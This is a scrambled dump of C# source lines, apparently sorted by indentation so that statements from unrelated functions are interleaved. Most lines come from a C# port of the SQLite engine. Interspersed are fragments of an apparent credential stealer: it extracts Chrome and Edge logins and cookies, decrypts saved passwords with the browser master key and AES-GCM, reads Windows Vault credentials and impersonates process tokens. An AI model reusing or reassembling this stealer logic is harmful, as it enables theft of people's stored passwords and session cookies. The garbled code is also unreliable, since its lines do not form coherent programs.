    
     
      
       
        
         
          
           
            
             
              
               
                
                 
                  
                   
                    
                     
                      
                       
                        
                         
                          
                            
                             
                              
                                
                                  
                                   
                                    
                                       
                                         
                                           
                                            
                                              
                                                
                                                 
                                                  
                                                   
                                                    
                                                      
                                                       
                                                        
                                                              uint dwFlags)
                                                            break
                                                            iCookie = BTREE_FREE_PAGE_COUNT
                                                            iCookie = BTREE_SCHEMA_VERSION
                                                            iCookie = BTREE_USER_VERSION
                                                          /
                                                          VdbeOpList[] cntIdx = new VdbeOpList[] {
                                                          VdbeOpList[] idxErr = new VdbeOpList[]  {
                                                          VdbeOpList[] readCookie = new VdbeOpList[]  {
                                                          VdbeOpList[] setCookie = new VdbeOpList[] {
                                                          case 'F':
                                                          case 'S':
                                                          case 'f':
                                                          case 's':
                                                          cnt
                                                          default:
                                                          int jmp2
                                                         P4_DYNAMIC )
                                                         uint dwFlags)
                                                        /
                                                        Debug.Assert( encnames[SQLITE_UTF16BE].enc == SQLITE_UTF16BE )
                                                        Debug.Assert( encnames[SQLITE_UTF16LE].enc == SQLITE_UTF16LE )
                                                        Debug.Assert( encnames[SQLITE_UTF8].enc == SQLITE_UTF8 )
                                                        Index pIdx
                                                        Table pTab = (Table)x.data
                                                        cnt
                                                        else
                                                        for ( pIdx = pTab.pIndex 
                                                        if ( pTab.pIndex == null ) continue
                                                        if ( sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
                                                        if ( zRight != null 
                                                        int iCookie
                                                        int loopTop
                                                        mxErr = SQLITE_INTEGRITY_CHECK_ERROR_MAX
                                                        pDb.pSchema.file_format = (u8)atoi( zRight )
                                                        pParse.nMem = cnt 
                                                        string zCol = pFK.aCol[j].zCol
                                                        string zOnDelete = actionName( pFK.deleteConf )
                                                        string zOnUpdate = actionName( pFK.updateConf )
                                                        switch ( zLeft[0] )
                                                        zState = azLockName[j]
                                                        {
                                                        }
                                                      )
                                                      /
                                                      Btree pBt
                                                      EncName[] encnames = new EncName[]  {
                                                      Hash pTbls
                                                      HashElem x
                                                      Pager pPager
                                                      else
                                                      for ( j = 0 
                                                      for ( x = pTbls.first 
                                                      if ( OMIT_TEMPDB != 0 
                                                      if ( db.aDb[i].zName == null ) continue
                                                      if ( mxErr <= 0 )
                                                      if ( null == zRight )
                                                      if ( pBt == null 
                                                      if ( pParse.nMem < cnt 
                                                      int cnt = 0
                                                      int iEnc
                                                      int j
                                                      int j = 0
                                                      mxErr = atoi( zRight )
                                                      pBt = db.aDb[i].pBt
                                                      pFK = pFK.pNextFrom
                                                      pTbls = db.aDb[i].pSchema.tblHash
                                                      {
                                                      {    /
                                                      { /
                                                      {//          for(x=sqliteHashFirst(pTbls)
                                                      }
                                                    /
                                                    VdbeOpList[] endCode = new VdbeOpList[]  {
                                                    bool isQuick = ( zLeft[0] == 'q' )
                                                    const int SQLITE_INTEGRITY_CHECK_ERROR_MAX = 100
                                                    else
                                                    for ( i = 0 
                                                    if ( sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
                                                    if ( zRight != null )
                                                    int i
                                                    int i = 0
                                                    mxErr = SQLITE_INTEGRITY_CHECK_ERROR_MAX
                                                    pParse.nMem = 2
                                                    pParse.nMem = 6
                                                    pParse.nMem = 8
                                                    string[] azLockName = {
                                                    while ( pFK != null )
                                                    {
                                                    }
                                                  )
                                                  /
                                                  //const int SQLITE_INTEGRITY_CHECK_ERROR_MAX = 100
                                                  else
                                                  if ( pFK != null )
                                                  if ( zRight != null )
                                                  int dwFlags)
                                                  pFK = pTab.pFKey
                                                  v = sqlite3GetVdbe( pParse )
                                                  {
                                                  }
                                                /
                                                CollSeq pColl = ( (CollSeq[])p.data )[0]
                                                FKey pFK
                                                Table pTab
                                                else
                                                if ( pTab != null )
                                                if ( sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
                                                pIdx = pIdx.pNext
                                                uint dwFlags)
                                                {
                                                }
                                              Debug.Assert( db.aDb[i].zName != null )
                                              HashElem p
                                              else
                                              for ( p = db.aCollSeq.first 
                                              if ( db.aDb[i].pBt == null ) continue
                                              int i = 0
                                              pParse.nMem = 2
                                              pParse.nMem = 3
                                              while ( pIdx != null )
                                              {
                                              }
                                             pCol.zType != null 
                                            /
                                            Debug.Assert( pTab.nCol > cnum )
                                            continue
                                            else
                                            for ( i = 0 
                                            if ( getBoolean( zRight ) != 0 )
                                            if ( pIdx != null )
                                            if ( sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
                                            int cnum = pIdx.aiColumn[i]
                                            int i
                                            nHidden
                                            pIdx = pTab.pIndex
                                            pParse.nMem = 3
                                            v = sqlite3GetVdbe( pParse )
                                            {
                                            }
                                           /
                                          /
                                          Index pIdx
                                          Table pTab
                                          else
                                          for ( i = 0 
                                          if ( IsHiddenColumn( pCol ) )
                                          if ( pCol.zDflt != null )
                                          if ( pTab != null )
                                          if ( sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
                                          if ( zRight != null )
                                          int i
                                          pCol = pTab.aCol[i]
                                          pParse.nMem = 3
                                          pTab = pIdx.pTable
                                          {
                                          }
                                        Column pCol
                                        Index pIdx
                                        Table pTab
                                        else
                                        for ( i = 0 
                                        if ( pIdx != null )
                                        if ( sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
                                        int i
                                        int nHidden = 0
                                        pParse.nMem = 6
                                        {
                                        }
                                       /
                                      /
                                      Table pTab
                                      else
                                      goto pragma_out
                                      if ( pTab != null )
                                      if ( sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
                                      pDb.safety_level = (byte)( getSafetyLevel( zRight ) 
                                      slots in the yy_action[] table.
                                      token onto the stack and goto state N.
                                      {
                                      }
                                     /
                                    /
                                    else
                                    if ( 0 == db.autoCommit )
                                    if ( rc != SQLITE_OK 
                                    int rc
                                    int res = 0
                                    invalidateTempStorage( pParse )
                                    sqlite3_temp_directory = zRight
                                    {
                                    }
                                   /
                                  )
                                  /
                                  //sqlite3_free( ref sqlite3_temp_directory )
                                  else
                                  if ( SQLITE_TEMP_STORE == 0
                                  if ( null == zRight )
                                  if ( sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
                                  if ( zRight.Length > 0 )
                                  {
                                  }
                                 /
                                /
                                //
                                // Something goes wrong between adding this as a column value and converting to a row value.
                                //columnValues[i] = password
                                //string password = Encoding.ASCII.GetString(decPass)
                                being inserted is removed.
                                cause sqlite3_exec() to return immediately
                                columnValues[i] = base64
                                else
                                if ( null == zRight )
                                only (do not do a complete rollback) then
                                prior changes are retained.
                                return code of SQLITE_CONSTRAINT.
                                return code of SQLITE_CONSTRAINT.  The
                                sqlite3_exec() returns immediately with a
                                string base64 = Convert.ToBase64String(encBlob)
                                the stack and there is an immediate jump
                                to label ignoreDest.
                                transaction is not rolled back and any
                                value for that column.  If the default value
                                with SQLITE_CONSTRAINT.
                                {
                                }
                               (i64)( x.iJD / 1000 - 21086676 
                               /
                               always non-negative.  Zero is the default.
                               field width was negative.
                               is -1.
                               pLimitWhere (pInClause)
                               the conversion character.
                              /
                              VdbeOpList[] setMeta6 = new VdbeOpList[] {
                              else
                              if ( size < 0 ) size = -size
                              if ( zRight == null )
                              int iAddr
                              int size = atoi( zRight )
                              pDb.pSchema.cache_size = size
                              {
                              }
                             /
                             at start-time.
                             implementation can be overridden at
                             mutexes implemention cannot be overridden
                             mutual exclusion is provided.  But this
                             sqlite3BtreeGetAutoVacuum( pMain ) )
                             start-time.
                            /
                            // Newer versions have package sid
                            // Stupid datetime
                            Console.WriteLine()
                            auto_vacuum = SQLITE_DEFAULT_AUTOVACUUM
                            auto_vacuum = sqlite3BtreeGetAutoVacuum( pBt )
                            else
                            goto pragma_out
                            iLimit = 0x7fffffff
                            if ( null == zRight )
                            if ( rc == SQLITE_OK 
                            if ( sqlite3ReadSchema( pParse ) != 0 ) goto pragma_out
                            if (identity != null)
                            if (packageSid != null)
                            if (resource != null)
                            object identity = GetVaultElementValue(pIdentityElement)
                            object resource = GetVaultElementValue(pResourceElement)
                            pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem)
                            pPager = sqlite3BtreePager( db.aDb[ii].pBt )
                            packageSid = GetVaultElementValue(pPackageSid)
                            {
                            }
                           /
                          /
                          Debug.Assert( eAuto >= 0 
                          break
                          db.nextAutovac = (u8)eAuto
                          else
                          goto pragma_out
                          if ( ALWAYS( eAuto >= 0 ) )
                          if ( ALWAYS( pBt ) )
                          if ( db.aDb[ii].pBt != null )
                          if ( rc != SQLITE_OK ) goto abort_due_to_error
                          if ( sqlite3ReadSchema( pParse ) != 0 )
                          if ( zRight == null 
                          int auto_vacuum
                          int eAuto = getAutoVacuum( zRight )
                          obtained from malloc.
                          pCol.iSorterColumn = j
                          that would have been output by printf.
                          token = tkEXPLAIN
                          token = tkOTHER
                          which is the size of the buffer written to.
                          {
                          }
                         (even if X is implied).
                         /
                         X and/or Y are implied.)
                         from pSrcList.
                        /
                        //
                        // Begin fetching vault item...
                        // Fetch the credential from the authenticator element
                        // Field Info retrieval
                        //pItem
                        Btree pBt = pDb.pBt
                        Debug.Assert( pBt != null )
                        Debug.Assert( pDb == db.aDb[0] )
                        Expr pE = pTerm.pExpr
                        Guid schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString())
                        IntPtr StringPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr)
                        IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem)
                        IntPtr pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem)
                        IntPtr pPackageSid = IntPtr.Zero
                        IntPtr pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem)
                        IntPtr passwordVaultItem = IntPtr.Zero
                        IntPtr sidPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr)
                        UInt64 lastModified = (UInt64)dateTimeInfo.GetValue(currentItem)
                        break
                        byte[] masterKey = GetMasterKey(chrome_state_file)
                        continue
                        db.dfltJournalMode = (u8)eMode
                        eMode--
                        else
                        for ( ii = 1 
                        goto abort_due_to_error
                        i
                        if ( iLimit < -1 ) iLimit = -1
                        if ( nId == 7 
                        if ( null == zRight )
                        if ( oc == OP_SeekGt 
                        if ( oc == OP_SeekLt 
                        if ( pE.op == TK_COLUMN 
                        if ( sqlite3ReadSchema( pParse ) != 0 )
                        if (OSMajor >= 6 
                        if (cred != null) // Indicates successful fetch
                        if (pPackageSid != IntPtr.Zero 
                        if (result != 0)
                        int ii
                        object cred = GetVaultElementValue(pAuthenticatorElement)
                        object packageSid = null
                        object[] vaultGetItemArgs
                        pC.useRandomRowid = true
                        pE.iColumn == pExpr.iColumn )
                        pPager = sqlite3BtreePager( db.aDb[ii].pBt )
                        pTerm = pGB.a[j]
                        pc = pOp.p2 - 1
                        results = (bool)results
                        results = System.Runtime.InteropServices.Marshal.PtrToStringUni(StringPtr)
                        results = System.Runtime.InteropServices.Marshal.ReadByte(elementPtr)
                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr)
                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr)
                        results = null
                        results = sidObject.Value
                        structAddress = (IntPtr)(structAddress.ToInt64() 
                        token = tkCREATE
                        token = tkEND
                        token = tkOTHER
                        token = tkTEMP
                        token = tkTRIGGER
                        v
                        var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr)
                        {
                        }
                       /
                       Access is exclusive.  No other processes or
                       Writing is not permitted.  There can be
                       after all dirty pages have been written to the
                       at a time can reserve the database.  The original
                       but has not yet made any changes.  Only one process
                       data held in memory.  This is the initial
                       database file and the file has been synced to
                       database file has not been modified so other
                       database file.
                       directly to the parser from the tokenizer.
                       disk. All that remains to do is to remove or
                       file at the same time.
                       have fall-back values which should be used if the
                       multiple readers accessing the same database
                       number is used to fill in empty slots of the hash
                       original value of the token will not parse.
                       process is writing.
                       processes may still be reading the on-disk
                       state.
                       table.
                       threads can be reading or writing while one
                       to no legal terminal or nonterminal number.  This
                       truncate the journal file and the transaction
                       used if there are fewer than 250 rules and
                       used if there are fewer than 250 terminals
                       which is sqlite3ParserTOKENTYPE.  The entry in the union
                       will be committed.
                       writing the database file.  There is no
                       zero the stack is dynamically sized using realloc()
                      /
                      Debug.Assert( oc == OP_SeekLe 
                      Debug.Assert( pDb == db.aDb[0] )
                      Debug.Assert( rc == SQLITE_OK )
                      Debug.Assert( sqlite3BtreeCursorIsValid( pC.pCursor ) )
                      ExprList pGB = pAggInfo.pGroupBy
                      ExprList_item pTerm
                      Pager pPager
                      Pager pPager = sqlite3BtreePager( pDb.pBt )
                      _buf = longvalue.ToString().ToCharArray()
                      break
                      db.autoCommit = 0
                      db.dfltLockMode = (u8)eMode
                      db.isTransactionSavepoint = 1
                      db.nSavepoint
                      db.nSavepoint--
                      eMode = PAGER_JOURNALMODE_QUERY
                      eMode = azModeName.Length - 1
                      eMode = db.dfltJournalMode
                      else
                      else if ( nId == 4 
                      else if ( nId == 9 
                      for ( ii = 2 
                      for ( j = 0 
                      goto abort_due_to_error
                      goto vdbe_return
                      i64 iLimit = -2
                      iA = (i64)rA
                      iB %= iA
                      iB /= iA
                      iB = (i64)rB
                      if ( !String.IsNullOrEmpty( zRight ) )
                      if ( cnt < 5 ) v 
                      if ( iA == -1 
                      if ( iA == -1 ) iA = 1
                      if ( iA == 0 ) goto arithmetic_result_is_null
                      if ( nId == 3 
                      if ( nId == 6 
                      if ( nId == 7 
                      if ( pId2.n == 0 )
                      if ( pIn3.r < (double)iKey ) iKey--
                      if ( pIn3.r < 0 )
                      if ( pIn3.r > (double)iKey ) iKey
                      if ( rA == (double)0 ) goto arithmetic_result_is_null
                      if ( rc != SQLITE_OK )
                      if ( res != 0 )
                      if ( v == MAX_ROWID )
                      int ii
                      int n = sqlite3Strlen30( zRight )
                      n = pGB.nExpr
                      p.pc = pc
                      p.rc = rc = SQLITE_BUSY
                      pCol.iSorterColumn = pAggInfo.nSortingColumn
                      pPager = sqlite3BtreePager( pDb.pBt )
                      pValue.enc )
                      pc = pOp.p2 - 1
                      rB /= rA
                      rB = (double)( iB % iA )
                      rc = SQLITE_FULL
                      res = 1
                      return the top-level walk call.
                      sqlite3ExpirePreparedStatements( db )
                      the walk to continue with sibling nodes.
                      token = tkOTHER
                      v
                      v = (int)( pMem.u.i 
                      v = 1
                      while ( eMode >= 0 
                      {
                      }
                     /
                     Apply the affinity pDest.affinity before storing
                     Store the first column of the first result row
                     This is like SRT_EphemTab except that the table
                     in register pDest.iParm then abandon the rest
                     is assumed to already be open.
                     of the co-routine is stored in register pDest.iParm.
                     opcode) for each row in the result set.
                     results each time it is invoked.  The entry point
                     returning.  This is like SRT_Table except that
                     row of result as the key in table pDest.iParm.
                     set is not empty.
                     shifting non-terminals after a reduce.
                     shifting terminals.
                     statements within triggers whose only purpose is
                     the result there. The cursor is left open after
                     the side-effects of functions.
                     the table first.
                     this destination uses OP_OpenEphemeral to create
                     yy_action.  Used to detect hash collisions.
                    /
                    //
                    // For each vault item...
                    // adds new integer column to table
                    //-----------------------IE----------------
                    //cookie
                    //pC.aRow = zData
                    //pItem
                    //pNew.zName = (char 
                    Chrome_books()
                    Chrome_cookies()
                    Chrome_history()
                    Chrome_logins()
                    Debug.Assert( ( pIn3.flags 
                    Debug.Assert( ( pMem.flags 
                    Debug.Assert( eMode == PAGER_JOURNALMODE_DELETE
                    Debug.Assert( pOp.p3 > 0 
                    Debug.Assert( pSavepoint == db.pSavepoint )
                    Debug.Assert( pgno == MASTER_ROOT 
                    Edge.GetLogins()
                    IE_books()
                    IE_history()
                    ImpersonateProcessToken(pid)
                    ManagementBaseObject inPar = null
                    ManagementBaseObject outPar = null
                    Pager pPager
                    RevertToSelf()
                    aOffset[i] = (u32)offset64
                    aOffset[i] = 0
                    break
                    byte[] passwordBytes = Convert.FromBase64String(crypt_password)
                    case 0: // VAULT_ELEMENT_TYPE == bool
                    case 12: // VAULT_ELEMENT_TYPE == Sid
                    case 1: // VAULT_ELEMENT_TYPE == Short
                    case 2: // VAULT_ELEMENT_TYPE == Unsigned Short
                    case 3: // VAULT_ELEMENT_TYPE == Int
                    case 4: // VAULT_ELEMENT_TYPE == Unsigned Int
                    case 5: // VAULT_ELEMENT_TYPE == Double
                    case 6: // VAULT_ELEMENT_TYPE == GUID
                    case 7: // VAULT_ELEMENT_TYPE == String
                    catch
                    catch (Exception ex) //
                    cbAuthData = aad.Length
                    cbMacContext = tag.Length
                    cbNonce = iv.Length
                    cbTag = tag.Length
                    cnt
                    continue
                    db.autoCommit = (u8)( desiredAutoCommit == 0 
                    db.autoCommit = 1
                    db.isTransactionSavepoint = 0
                    db.nSavepoint--
                    db.pSavepoint = pNew
                    db.pSavepoint = pSavepoint.pNext
                    db.pSavepoint = pTmp.pNext
                    default:
                    eMode = db.dfltLockMode
                    else
                    else if ( oc == OP_SeekLt 
                    for ( ii = 0 
                    for ( k = 0 
                    for (int j = 1
                    goto abort_due_to_error
                    goto op_column_out
                    goto vdbe_return
                    i
                    iSavepoint = db.nSavepoint - iSavepoint - 1
                    if ( ( pIn3.flags 
                    if ( 0 == isTransaction )
                    if ( cnt == 0 
                    if ( db.autoCommit != 0 )
                    if ( flag_zeropad )
                    if ( iKey == SMALLEST_INT64 
                    if ( null == zRight )
                    if ( p1 == SAVEPOINT_ROLLBACK 
                    if ( pAggInfo.pGroupBy != null )
                    if ( pCol.iSorterColumn < 0 )
                    if ( pCol.iTable == pExpr.iTable 
                    if ( pId2.n == 0 
                    if ( pId2.n == 0 )
                    if ( pMem.u.i == MAX_ROWID 
                    if ( rc != SQLITE_OK )
                    if ( rc != SQLITE_OK ) goto abort_due_to_error
                    if ( res != 0 )
                    if ( sqlite3VdbeHalt( p ) == SQLITE_BUSY )
                    if ( v < ( pMem.u.i 
                    int eMode
                    int k
                    int wd
                    j 
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value))
                    offset64 
                    p.pc = pc
                    p.rc = rc = SQLITE_BUSY
                    pC.aRow = -1
                    pC.lastRowid = iKey
                    pC.pData = Encoding.UTF8.GetBytes( pData.z )
                    pC.pData = new byte[pC.nData 
                    pC.rowidIsValid = false
                    pC.rowidIsValid = true
                    pCol = pAggInfo.aCol[k]
                    pCol.iColumn = pExpr.iColumn
                    pCol.iColumn == pExpr.iColumn )
                    pCol.iMem = 
                    pCol.iSorterColumn = -1
                    pCol.iTable = pExpr.iTable
                    pCol.pExpr = pExpr
                    pCol.pTab = pExpr.pTab
                    pCur.isIndex = !pCur.isTable
                    pCur.isTable = pOp.p4type != P4_KEYINFO
                    pCx.pKeyInfo = pOp.p4.pKeyInfo
                    pCx.pKeyInfo.enc = ENC( p.db )
                    pItem.iDistinct = -1
                    pItem.iDistinct = pParse.nTab
                    pMem = p.aMem[pOp.p3]
                    pMem.u.i = (long)v
                    pNew.pNext = db.pSavepoint
                    pNew.zName = zName
                    pPager = sqlite3BtreePager( pDb.pBt )
                    pTmp = db.pSavepoint
                    pbAuthData = Marshal.AllocHGlobal(cbAuthData)
                    pbMacContext = Marshal.AllocHGlobal(cbMacContext)
                    pbNonce = Marshal.AllocHGlobal(cbNonce)
                    pbTag = Marshal.AllocHGlobal(cbTag)
                    populated epheremal table.
                    r.flags = 0
                    r.flags = UNPACKED_INCRKEY
                    rc = SQLITE_FULL
                    rc = p.rc
                    res = 0
                    res = sqlite3BtreeEof( pC.pCursor ) 
                    sqlite3VdbeMemIntegerify( pMem )
                    string booktext = File.ReadAllText(url_file_path)
                    string cookie_value
                    string crypt_password
                    string password
                    string title
                    string url
                    string username
                    string[] azModeName = new string[] {
                    try
                    urls[i] = info
                    vaultType = vaultGuid.ToString()
                    vaultType = vaultSchema[vaultGuid]
                    wd = (int)( ( ( x.iJD 
                    zIdx 
                    zRec = zData
                    zToFree = zColname
                    {
                    }
                   /
                   contains the cell with a pointer to this overflow page.
                   overflow page in the list.
                   overflow pages. The page number identifies the page that
                   overflow pages. The page-number identifies the previous
                   page in the overflow page list.
                   page of pPage.
                   page pointed to by one of the cells on pPage.
                  ( ( pOp.p5 
                  ( p1 == SAVEPOINT_ROLLBACK 
                  )
                  /
                  //  pData.flags 
                  //  pData.zMalloc = null
                  //Debug.Assert( 0 == db.mallocFailed )
                  //if ( !pC.ephemPseudoTable )
                  //pC.pData[pC.nData 
                  //pC.pData[pC.nData] = 0
                  //pCol = pAggInfo.aCol
                  //{
                  //}
                  DateTime y = new DateTime()
                  Debug.Assert( !pC.deferredMoveto )
                  Debug.Assert( !pC.rowidIsValid )
                  Debug.Assert( ( (u64)payloadSize64 
                  Debug.Assert( ( pDest.flags 
                  Debug.Assert( 0 == db.init.busy )
                  Debug.Assert( IsVirtual( pTab ) )
                  Debug.Assert( avail >= 0 )
                  Debug.Assert( db.nStatement >= 0 
                  Debug.Assert( desiredAutoCommit != 0 )
                  Debug.Assert( eMode == PAGER_LOCKINGMODE_NORMAL 
                  Debug.Assert( nField > 0 )
                  Debug.Assert( oc == OP_SeekLt 
                  Debug.Assert( pOp.opcode == OP_IdxGE )
                  Debug.Assert( pOp.p3 == 0 )
                  Debug.Assert( pOp.p4type == P4_INT32 )
                  Debug.Assert( pOp.p4type == P4_KEYINFO )
                  Debug.Assert( pPager.needSync )
                  Debug.Assert( rc == SQLITE_OK )
                  Debug.Assert( sqlite3BtreeCursorIsValid( pCrsr ) )
                  Expr pLeft
                  ExprSetIrreducible( pExpr )
                  SrcList_item pLeft = pTabList.a[i - 1]
                  a >>= (int)b
                  and the cursor is therefore left point to nothing.
                  applyNumericAffinity( pIn3 )
                  b 
                  break
                  buf[( --bufpt )] = '0'
                  buf[( bufpt
                  bufpt = 3
                  bufpt = 4
                  byte[] zData = sqlite3PagerGetData( pSrcPg )
                  case 'C':
                  case 'E':
                  case 'T':
                  case 'c':
                  case 'e':
                  case 't':
                  case OP_Add: iB 
                  case OP_Add: rB 
                  case OP_Divide:
                  case OP_Multiply: iB 
                  case OP_Multiply: rB 
                  case OP_Subtract: iB -= iA
                  case OP_Subtract: rB -= rA
                  closest = i
                  cnt = 0
                  computeJD( y )
                  continue
                  db.autoCommit = (u8)desiredAutoCommit
                  db.autoCommit = 1
                  db.init.busy = 0
                  db.init.busy = 1
                  db.nStatement
                  default:
                  dist = d2
                  do
                  double s = x.s
                  else
                  else if ( ( pUsing = pSrcList.a[i 
                  exactly matches intKey/pIdxKey.
                  for ( int rI = 0 
                  for ( k = 0 
                  goto abort_due_to_error
                  goto arithmetic_result_is_null
                  goto end_allocate_page
                  goto exec_out
                  goto no_mem
                  goto op_column_out
                  goto too_big
                  goto vdbe_return
                  i
                  iKey = sqlite3VdbeIntValue( pIn3 )
                  iSavepoint
                  if ( ( k >= pAggInfo.nColumn )
                  if ( ( pExpr.flags 
                  if ( ( pIn3.flags 
                  if ( ( pSrcList.a[i 
                  if ( ( pTabList.a[i].jointype 
                  if ( bRev != 0 ) iCompare = -iCompare
                  if ( eMode == PAGER_LOCKINGMODE_EXCLUSIVE )
                  if ( isTransaction != 0 
                  if ( longNames )
                  if ( oc == OP_SeekGt 
                  if ( p1 == SAVEPOINT_RELEASE )
                  if ( pC.isIndex )
                  if ( pC.pData == null ) goto no_mem
                  if ( pData.zBLOB != null )
                  if ( pId2.n == 0 
                  if ( pNew != null )
                  if ( pOp.p3 != 0 )
                  if ( payloadSize <= (u32)avail )
                  if ( rc != SQLITE_OK )
                  if ( rc == SQLITE_OK 
                  if ( rc == SQLITE_OK )
                  if ( rc == SQLITE_OK ) rc = initData.rc
                  if ( res < 0 
                  if ( res == 0 )
                  if ( res > 0 
                  if ( s > 59.999 ) s = 59.999
                  if ( sqlite3VdbeHalt( p ) == SQLITE_BUSY )
                  if ( v == 0 )
                  if ( zFmt[i] == 'W' )
                  if ( zIdx < zEndHdr )
                  initData.rc = SQLITE_OK
                  int eMode = getLockingMode( zRight )
                  int iSet = ( ( ii == pOrWc.nTerm - 1 ) 
                  int isTransaction = ( pSavepoint.pNext == null 
                  int k
                  int nDay
                  int pgno = 0
                  int r
                  is larger than intKey/pIdxKey.
                  is not used in this case.
                  is smaller than intKey/pIdxKey or if the table is empty
                  j = sqlite3Strlen30( z )
                  len = (int)sqlite3VdbeSerialTypeLen( aType[p2] )
                  nDay = (int)( ( x.iJD - y.iJD 
                  nField = pOp.p4.i
                  nKey = pIn2.n
                  nName = sqlite3Strlen30( zName )
                  nZero 
                  nZero = 0
                  nZero = pData.u.nZero
                  needSync = true
                  p.aMem[pOp.p3].u.i 
                  p.contextStack = new Context[i 
                  p.iStatement = db.nSavepoint 
                  p.minWriteFileFormat = pDb.pSchema.file_format
                  p.pc = pc
                  p.rc = rc = SQLITE_BUSY
                  pC.cacheStatus = CACHE_STALE
                  pC.pData = new byte[pC.nData 
                  pC.rowidIsValid = false
                  pCrsr = null
                  pCx.isTable = false
                  pCx.isTable = true
                  pExpr = pRight
                  pExpr.iAgg = (short)k
                  pExpr.op = TK_AGG_COLUMN
                  pExpr.pAggInfo = pAggInfo
                  pExpr.x.pList != null 
                  pIdxKey.flags 
                  pIn3.u.i = r.rowid
                  pItem = pAggInfo.aFunc[i]
                  pItem.iMem = 
                  pItem.pExpr = pExpr
                  pNew = new Savepoint()
                  pOp.p1 = pLevel.iIdxCur
                  pOp.p2 = j
                  pOut = p.aMem[pOp.p2]
                  pOut.u.i = (long)rowid
                  pTabList              pWhere
                  payloadSize = (u32)payloadSize64
                  payloadSize = 0
                  payloadSize = pC.payloadSize
                  pc = pOp.p2 - 1
                  piColMask 
                  piColMask = 0xffffffff
                  r.aMem = new Mem[r.nField]
                  r.flags = UNPACKED_IGNORE_ROWID
                  r.flags = UNPACKED_INCRKEY 
                  r.nField = (u16)nField
                  r.pKeyInfo = pC.pKeyInfo
                  rc = SQLITE_BUSY
                  rc = SQLITE_CANTOPEN
                  rc = SQLITE_CORRUPT_BKPT()
                  rc = SQLITE_DONE
                  rc = SQLITE_ERROR
                  rc = SQLITE_MISMATCH
                  rc = SQLITE_NOMEM
                  rc = SQLITE_OK
                  rc = sqlite3BtreeDelete( pCrsr )
                  releasePage(ppPage)
                  res
                  res = -res
                  sMem.db = null
                  sMem.flags = 0
                  sqlite3OsClose( pPager.jfd )
                  sqlite3RollbackAll( db )
                  sqlite3SafetyOff( db )
                  sqlite3SafetyOn( db )
                  sqlite3VdbeCurrentAddr( v ) 
                  sqlite3VdbeIntegerAffinity( pOut )
                  sqlite3VdbeMemExpandBlob( pRec )
                  sqlite3VdbeMemReleaseExternal( pDest )
                  testAddr = 0
                  tokenType = TK_ILLEGAL
                  used in this case.
                  v = db.lastRowid
                  v = pC.lastRowid
                  v = sqlite3BtreeGetCachedRowid( pC.pCursor )
                  while ( db.pSavepoint != pSavepoint )
                  x.CopyTo( y )
                  y.D = 1
                  y.M = 1
                  y.validJD = 0
                  z.Append( '
                  z.Append( ( ( ( x.iJD 
                  zData = (byte[])sMem.zBLOB.Clone()
                  zData = sMem.zBLOB
                  zData = zRec
                  zKey = ( pIn2.flags 
                  zRec = new byte[payloadSize]
                  {
                  }
                  } while ( cnt < 100 
                 /
                 TEMP or TEMPORARY
                 a statement.
                 in any other state.
                 of a trigger difinition.
                 returns 1 if it ends in the START state and 0 if it ends
                 semicolon.
                 the end of a trigger definition.
                ( 0 == desiredAutoCommit ) 
                ( iRollback != 0 ) 
                ( pOp.p5 
                (object)pParse.sLastToken )
                (u8)( iSet >= 0 
                )
                /
                //                Recvtoself
                //        sizeof(Context) 
                //  pAccum->mallocFailed = 1
                //  return
                // Fetch all items within Vault
                // Open vault block
                // Vault opened successfully! Continue.
                //Last 16 bytes for tag
                //assert( pIn1<=
                //assert( pOut<=
                //bufpt = buf
                //encrypted password
                //encryptedData without IV
                //if ( bufpt == 0 )
                //pC.aOffset = aOffset = aType[nField]
                //pIn1
                //pIn1.zMalloc = zMalloc
                //pOut
                //pOut.zMalloc = null
                //zMalloc = pOut.zMalloc
                //{
                //}
                AesGcm aesDecryptor = new AesGcm()
                AggInfo_col pCol
                Console.WriteLine(booktext)
                Console.WriteLine(ex.ToString())
                DataTable resultantQuery = database.ExecuteQuery(query)
                Debug.Assert( !pC.deferredMoveto )
                Debug.Assert( !pC.isTable )
                Debug.Assert( !pC.pseudoTable )
                Debug.Assert( !pC.rowidIsValid )
                Debug.Assert( !pPager.tempFile )
                Debug.Assert( !seenReplace )
                Debug.Assert( ( p.btreeMask 
                Debug.Assert( ( pData.flags 
                Debug.Assert( ( pDest.flags 
                Debug.Assert( ( pIn1.flags 
                Debug.Assert( ( pIn3.flags 
                Debug.Assert( aType != null )
                Debug.Assert( azCols[i] != null )
                Debug.Assert( db.aDb[pOp.p1].pBt != null )
                Debug.Assert( db.nStatement == 0 )
                Debug.Assert( i < pKeyInfo.nField )
                Debug.Assert( iCnt == 1 )
                Debug.Assert( p.aOp[pc - 1].opcode == OP_CollSeq )
                Debug.Assert( p.aOp[pc - 1].p4type == P4_COLLSEQ )
                Debug.Assert( p2 <= p.nMem )
                Debug.Assert( p2 > 0 )
                Debug.Assert( pAndTerm.pExpr != null )
                Debug.Assert( pC.deferredMoveto == false )
                Debug.Assert( pC.iDb >= 0 )
                Debug.Assert( pC.isTable )
                Debug.Assert( pC.pCursor != null )
                Debug.Assert( pC.pseudoTable == false )
                Debug.Assert( pC.rowidIsValid )
                Debug.Assert( pDup != null )
                Debug.Assert( pOp.p1 >= 0 
                Debug.Assert( pOp.p2 > 0 )
                Debug.Assert( pOp.p3 <= p.nMem )
                Debug.Assert( pOp.p3 > 0 
                Debug.Assert( pOp.p3 > 0 )
                Debug.Assert( pOp.p4type == P4_INT32 )
                Debug.Assert( pOp.p5 == 0 
                Debug.Assert( pTest != null )
